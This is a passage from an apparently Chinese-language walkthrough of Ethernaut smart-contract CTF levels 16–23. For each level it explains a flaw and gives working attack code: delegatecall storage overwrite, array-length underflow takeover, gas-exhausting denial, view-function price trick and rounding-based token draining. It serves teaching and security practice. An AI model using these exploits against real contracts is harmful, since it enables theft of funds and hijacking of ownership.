class="line">===================================================</span><br><span class="line">    unused (12 bytes) | timeZone1Library (20 bytes)slot 0   </span><br><span class="line">===================================================</span><br><span class="line">    unused (12 bytes) | timeZone2Library (20 bytes)slot 1</span><br><span class="line">===================================================        </span><br><span class="line">    unused (12 bytes) | owner (20 bytes)                  slot 2</span><br><span class="line">===================================================</span><br><span class="line">          storedTime (32 bytes)    slot 3</span><br><span class="line">===================================================</span><br></pre></td></tr></table></figure><p>对于 LibraryContract 合约的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===================================================</span><br><span class="line">          storedTime (32 bytes)                           slot 0</span><br><span class="line">===================================================</span><br></pre></td></tr></table></figure><p>当合约初始化时，<code>Preservation</code> 的 slot 0 和 slot 1 存储的是 LibraryContract 合约的地址，slot 2 存储的是 owner 的地址，因此我们的最终目的就是将 slot 2 修改为player 的地址。</p><p>当我们调用<code>setFirstTime</code>函数时，实际上是在<code>Preservation</code>合约内部调用<code>setTme</code>函数，此时修改的变量时slot 0，我们可以利用这一点去修改<code>timeZone1Library</code>=变量的值，所以我们可以将其设置为恶意合约的地址，并在恶意合约内写一个<code>setTime</code>函数，当执行<code>setFirstTime</code>函数时，就会调用到我们恶意合约内部的<code>setTime</code>函数，那么就可以实现合约的任意代码执行，实现变量覆盖。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract PreservationExploit &#123;</span><br><span class="line">      address public timeZone1Library;</span><br><span class="line">      address public timeZone2Library;</span><br><span class="line">      address public owner; </span><br><span class="line">      </span><br><span class="line">      function setTime(uint256 timestamp) public &#123;</span><br><span class="line">          owner = address(timestamp);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击步骤：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">&#x27;攻击合约地址&#x27;</span>);</span><br><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">&#x27;player&#x27;</span>);</span><br></pre></td></tr></table></figure><p>调用<code>setFirstTime</code>俩次，实现俩次变量覆盖。</p><h3 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成这道题目的要求是找到丢失的合约地址找回丢失的0.5个以太币。思路是可以通过在<code>https://rinkeby.etherscan.io/</code>中查询<code>Recover</code>合约对应的地址，查看该合约的 <strong>Internal Txns</strong>从中找到创建的<code>SimpleToken</code>合约的地址。</p><p><img src="/image/Ethernaut.assets/image-20220922133444783.png" alt="image-20220922133444783"></p><p>在获取到<code>SimpleToken</code>地址后就可以调用合约中的 <code>destory</code>函数即可。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface SimpleToken &#123;</span><br><span class="line">    function destroy(address payable _to) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    address SimpleTokenAddr;</span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        SimpleTokenAddr = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        SimpleToken(SimpleTokenAddr).destroy(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种计算到合约地址的方法，每个账户都有一个关联的 nonce：对于普通账户，它在每笔交易中都会增加，而对于合约账户，它会在每次合约创建时增加。随机数不能重复使用，它们必须是顺序的</p><p><code>newAddr = keccak256(address, nonce)</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak, to_checksum_address, to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mk_contract_address</span>(<span class="params">sender: <span class="built_in">str</span>, nonce: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Create a contract address using eth-utils.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # https://ethereum.stackexchange.com/a/761/620</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    sender_bytes = to_bytes(hexstr=sender)</span><br><span class="line">    raw = rlp.encode([sender_bytes, nonce])</span><br><span class="line">    h = keccak(raw)</span><br><span class="line">    address_bytes = h[<span class="number">12</span>:]</span><br><span class="line">    <span class="keyword">return</span> to_checksum_address(address_bytes)</span><br></pre></td></tr></table></figure><h3 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18. MagicNumber"></a>18. MagicNumber</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目需要利用汇编语言部署一个微型合约。</p><p>首先需要了解合约在创建时会发生涉什么：</p><p><img src="/image/Ethernaut.assets/1*5Wrb7z3W6AMtjH6IKJYowg.jpeg" alt="img"></p><p>在初始化合约时：</p><ol><li><p>用户或合约向以太网发送交易，此交易包含数据，但是不包含接受者的地址。只是向EVM表明这是一个<code>contract Creation</code>，不是常规的事务。</p></li><li><p>然后EVM将Solidity代码编译为机器可读的字节码，字节码会转换为在调用栈中执行的操作码。</p><blockquote><p>创建合约的字节码包含合约初始化代码和合约运行时代码。</p></blockquote></li><li><p>在合约的创建过程中，EVM 只执行初始化代码直到执行堆栈中的第一个 <strong>STOP</strong> 或 <strong>RETURN</strong>指令，在这个阶段，合约的构造函数**(constructor()**)会执行并产生一个合约地址。</p></li><li><p>当初始代码运行后，只有运行时（runtime code）代码会保留在栈上，然后将这些操作码复制到内存中并返回到EVM。</p></li><li><p>最后，<strong>EVM</strong>将返回的剩余代码存储在 storage 中，并且与新的合约地址相关联。</p></li></ol><p>题目要求我们给出一个合约地址，该合约需要返回<code>whatIsTheMeaningOfLife()</code>的正确数字，这个数字题目中给出提示是42，而且这道题目还有一个要求，合约中只能有10个操作码，所以需要手动编写一个程序。</p><ol><li><p>首先运行时代码（runtime code）：构造返回42的逻辑，返回<code>0x42</code>且小于10个操作码。最后一条命令一定是<strong>RETURN</strong>，而<strong>RETURN</strong>命令返回时，栈顶（stack[0]）对应的数字是<strong>offset</strong>，stack[1]是<strong>length</strong>，最终返回的是<code>memory[offset:offset+length]</code>，所以需要把返回值42存储到<strong>memory</strong>中，代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000  60  PUSH1 0x2a</span><br><span class="line">0002  60  PUSH1 0x50</span><br><span class="line">0004  52  mstore</span><br><span class="line">0007  60  PUSH1 0x20</span><br><span class="line">0009  60  PUSH1 0x50  //低位用来存储运行时代码</span><br><span class="line">000B  F3  RETURN</span><br></pre></td></tr></table></figure><p>对应的字节码为<code>602a60505260206050f3</code>正好10个opcode，即正好10个字节</p></li><li><p>运行时代码构造完成后还需要在之前加上初始化代码，即将运行时代码复制到<code>memory</code>中，然后再RETURN，否则无法直接运行，复制代码需要用到<code>CODECOPY</code>指令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000  60  PUSH1 0x0a //length</span><br><span class="line">0002  60  PUSH1 0x0c</span><br><span class="line">0004  60  PUSH1 0x00</span><br><span class="line">0006  39  CODECOPY</span><br><span class="line">0007  60  PUSH1 0x0a</span><br><span class="line">0009  60  PUSH1 0x00</span><br><span class="line">000B  F3  RETURN</span><br></pre></td></tr></table></figure><p>第一步<code>PUSH1 0x0a</code>对应的是<strong>length</strong>变量，因为我们上面构造的<strong>opcode</strong>序列长度为10。第二步<code>PUSH1 0x0c</code>是因为，初始化代码的长度为0x0B，也就是运行时代码的字节码是从 0x0c 偏移开始的，因此<code>offset</code>为0xc。第三步<code>PUSH1 0</code>是指定将我们的代码复制到内存的slot 0处。前4条指令，<strong>完成了将0xC到0x16这10个字节复制到memory的0x00到0xA位置处的任务</strong>。</p><p>最终的代码为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000    60            PUSH1 0x0a</span><br><span class="line">0002    60            PUSH1 0x0c</span><br><span class="line">0004    60            PUSH1 0x00</span><br><span class="line">0006    39            CODECOPY</span><br><span class="line">0007    60            PUSH1 0x0a</span><br><span class="line">0009    60            PUSH1 0x00</span><br><span class="line">000B    F3            RETURN</span><br><span class="line">000C    60            PUSH1 0x2a</span><br><span class="line">000E    60            PUSH1 0x50</span><br><span class="line">0010    52            MSTORE</span><br><span class="line">0011    60            PUSH1 0x20</span><br><span class="line">0013    60            PUSH1 0x50</span><br><span class="line">0015    F3            RETURN</span><br></pre></td></tr></table></figure><p>对应的字节码序列为<code>600a600c600039600a6000f3602a60505260206050f3</code></p><p>使用we b3.js部署</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bytecode=<span class="string">&#x27;600a600c600039600a6000f3602a60505260206050f3&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.sendTransaction(&#123;<span class="attr">from</span>:player,<span class="attr">data</span>:bytecode&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">&#x27;0xF2AD1B93CFdCA35a97b69De0c3664033fEbeEE33&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19. Alien Codex"></a>19. Alien Codex</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">  codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求玩家获取到合约的控制权。合约中在开头引入了<code>Ownable</code>合约。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">        emit OwnershipTransferred(address(0), _owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner());</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return msg.sender == _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0));</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   在<code>Ownable</code>合约中有一个 address类型的变量  <code>_Owner</code>，只占用20字节，所有变量 <code>contact</code>和其存储在一个插槽中即存放在 slot 0中，而<code>codex.length</code>存储在 slot 1中，由于在合约初始化后动态数据为空，所以slot 1为 0，可以思考利用 <code>record</code>函数向动态数组中写入内容，覆盖掉 slot 0的低位的20字节，将其未覆盖为 player 的地址。</p><p><img src="/image/Ethernaut.assets/image-20220711212845554.png" alt="image-20220711212845554"></p><ol><li><p>由于slot 1的初始值为0，调用<code>retract</code>函数可以让<code>codex.length</code>减1，代码中没有对动态数组的长度进行溢出检查，可以让slot 1 存储的值下溢，slot 1 的值为$2^{256}-1$</p><blockquote><p>Solidity中动态数组内变量的存储位计算方法</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">b[X] == SLOAD(keccak256(slot) + X)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>然后计算动态数组第一个元素的存储位置<code>keccack256(1)=0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>，所以$2^256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6$得到的就是slot 0和codex动态数组的首地址偏移。</p></li><li><p>通过revise函数设置对应的偏移</p><p><code>contract.revise(&#39;offset&#39;,&#39;player&#39;) </code></p></li></ol><h3 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20. Denial"></a>20. Denial</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable public constant owner = address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend = address(this).balance.div(100);</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题是一个简单的钱包，会随着时间的推移而流失资金。玩家可以成为提款伙伴，慢慢提款。 当玩家在所有者调用withdraw() 时拒绝提取资金，就可以通过这道题目。</p><p>即当 owner 进行取款操作时，要阻止 <code>owner.transfer</code>操作，让合约仍有余额，并且交易的 gas 为 1M 或者更少时就可以通过。</p><p>这道题的主要漏洞在于<code>pathner.call</code>在调用call函数时没有检查返回值，也没有制定gas，这就<strong>导致如果外部调用是一个gas消耗很高的操作的话，就会使得整个交易出现<code>out of gas</code>的错误</strong>，然后发生<code>revert</code>，自然就无法执行<code>own.transfer</code>操作。</p><p><strong>攻击合约：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract attack &#123;</span><br><span class="line">address public target;</span><br><span class="line">constructor(address _addr) public payable &#123;</span><br><span class="line">target = _addr;</span><br><span class="line">target.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;,address(this)));</span><br><span class="line">&#125;</span><br><span class="line">fallback() external payable &#123;</span><br><span class="line">assert(false);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21. Shop"></a>21. Shop</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = true;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题要求以少于 100 的价格完成购买，<code>buy</code>函数内部的逻辑和第11题类似，但是这里的 price 变量用 <code>view</code>修饰，表示不能修改状态，即不能有以下操作：</p><ol><li>写状态变量</li><li>触发事件(emit events)</li><li>创建其他合约</li><li>使用<code>selfdestruct</code></li><li>通过<code>call</code>发送以太币</li><li>使用call调用任何没有被标记为<code>view</code>或者<code>pure</code>的函数</li><li>使用低级的<code>call</code></li><li>使用包含opcode的内联汇编</li></ol><p>所以不能使用状态变量标记<code>price</code>，但是这里可以利用<code>isSold</code>变量，当第一次调用<code>price</code>函数时， <code>isSold == false</code>，第二次调用时<code>isSold == true</code>，所以这里可以利用该通过<code>if</code>判断，通过部署攻击合约，利用攻击合约调用<code>buy</code>函数，通过<code>if</code>判断然后调用该合约中重写后的<code>price</code>方法，就会得到一个新的<code>price</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.7;</span><br><span class="line"></span><br><span class="line">interface IShop &#123;</span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">    function buy() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() public view returns (uint256) &#123;</span><br><span class="line">        return IShop(msg.sender).isSold() ? 0 : 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        IShop(levelInstance).buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22. Dex"></a>22. Dex</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题定义了一个用来交换货币的合约，其中token1和token2都是<code>SwappableToken</code>类型的一种erc20代币，这两个的地址在初始化实例时就确定了。player初始拥有这两种代币的数量为10，而合约拥有数量为100，我们的最终目的是，将合约中某种代币的数量清0，也就是让合约拥有的token1或者token2代币的数量为0。</p><p><code>get_swap_price</code>函数内部使用了除法，合约中将返回值定义为<code>uint</code>类型，由于除法可能产生小数，小数转整型不可避免地存在精度缺失问题，导致了在交换过程中我们可以获取更多代币。</p><p>首先调用<code>approve</code>函数，方便转账</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">await</span> contract.approve(contract.address,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>然后通过多次循环转账将拥有的代币全部交换。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Addr_token1 = (<span class="keyword">await</span> contract.token1())</span><br><span class="line">Addr_token2 = (<span class="keyword">await</span> contract.token2())</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">10</span>)</span><br><span class="line"><span class="comment">//第二次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">20</span>)</span><br><span class="line"><span class="comment">//第三次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">24</span>)</span><br><span class="line"><span class="comment">//第四次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">30</span>)</span><br><span class="line"><span class="comment">//第五次交换</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token1,Addr_token2,<span class="number">41</span>)</span><br><span class="line"><span class="comment">//第六次交换，注意这里是45就正好，多了会超过最大值报错</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(Addr_token2,Addr_token1,<span class="number">45</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="23-Dex2"><a href="#23-Dex2" class="headerlink" title="23. Dex2"></a>23. Dex2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function 